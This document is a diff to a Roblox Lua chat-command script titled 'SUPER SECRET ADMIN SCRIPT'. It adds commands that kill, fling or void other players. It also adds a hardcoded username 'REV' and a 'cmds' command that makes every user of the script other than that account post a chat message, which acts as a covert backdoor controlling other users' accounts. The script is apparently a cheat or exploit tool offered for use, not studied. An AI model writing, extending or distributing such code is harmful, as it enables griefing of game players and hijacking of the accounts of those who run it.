@@ -1,4 +1,5 @@
 --SUPER SECRET ADMIN SCRIPT 😳
+local REV = "Real_revvybxnned1"
 function getRoot(char)
 	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
 	return rootPart
@@ -46,11 +47,27 @@ function veryepictrol(x)
 			else
 				cmd = string.sub(msg,2)
 			end
-			if cmd == "reset" then
-				local Who = string.sub(msg,space+1)
-				local target = GetPlayer(Who)
-				print(Who)
-				target.Character.Humanoid.Health = 0
+
+if cmd == "reset" then
+local Who = string.sub(msg,space+1)
+local target = GetPlayer(Who)
+print(Who)
+target.Character.Humanoid.Health = 0
+end
+
+if cmd == "cmds" then
+local textChatService = game:GetService("TextChatService")
+if game.Players.LocalPlayer.Name ~= REV then
+textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Bed tp by rev!")
+end
+end
+
+if cmd == "ac" then
+local Who = string.sub(msg,space+1)
+local target = GetPlayer(Who)
+print(Who)
+h = target.Character:WaitForChild("HumanoidRootPart")
+h.RotVelocity = Vector3.new(9999,9999,9999)
 			end
 
 if cmd == "void" then
@@ -60,6 +77,8 @@ print(Who)
 h = target.Character:WaitForChild("HumanoidRootPart")
 h.CFrame = h.CFrame - Vector3.new(0,2000,0)
 			end
+
+
 	end	
 	end)
 	local d1;d1=game.Players.PlayerRemoving:connect(function(plr)
